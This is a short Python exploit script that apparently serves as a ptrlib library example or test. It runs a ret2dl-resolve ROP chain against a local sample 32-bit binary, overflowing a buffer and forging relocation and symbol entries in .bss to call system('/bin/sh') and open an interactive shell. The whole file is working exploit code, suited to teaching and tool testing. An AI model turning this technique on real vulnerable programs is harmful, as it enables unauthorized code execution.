#!/usr/bin/env python
from ptrlib import *
import time

elf = ELF("sample/test-ret2dl.x86")
sock = Process("sample/test-ret2dl.x86")

addr_reloc   = elf.section('.bss') + 0x100
addr_sym     = elf.section('.bss') + 0x280 # must be a bit far from bss top
addr_symstr  = elf.section('.bss') + 0x180
addr_command = elf.section('.bss') + 0x200
addr_got     = elf.got('read') # whichever GOT entry
addrList = {
    'reloc': addr_reloc,
    'sym': addr_sym,
    'symstr': addr_symstr,
    'got': addr_got
}
command = "/bin/sh\0"
function = "system\0"
reloc_ofs, reloc, sym = struct_ret2dl(addrList, elf)

addr_plt = elf.section(".plt")
rop_pop3 = 0x080484e9

payload = b'A' * 0x2c
payload += flat([
    p32(elf.plt("read")),
    p32(rop_pop3),
    p32(0),
    p32(addr_reloc),
    p32(len(reloc)),
])
payload += flat([
    p32(elf.plt("read")),
    p32(rop_pop3),
    p32(0),
    p32(addr_sym),
    p32(len(sym)),
])
payload += flat([
    p32(elf.plt("read")),
    p32(rop_pop3),
    p32(0),
    p32(addr_symstr),
    p32(len(function)),
])
payload += flat([
    p32(elf.plt("read")),
    p32(rop_pop3),
    p32(0),
    p32(addr_command),
    p32(len(command)),
])
payload += p32(addr_plt)
payload += p32(reloc_ofs)
payload += p32(0xdeadbeef)
payload += p32(addr_command)
payload += b'\0' * (0x100 - len(payload)) # breaks environ
sock.send(payload)

sock.send(reloc)
sock.send(sym)
sock.send(function)
sock.send(command)

sock.interactive()
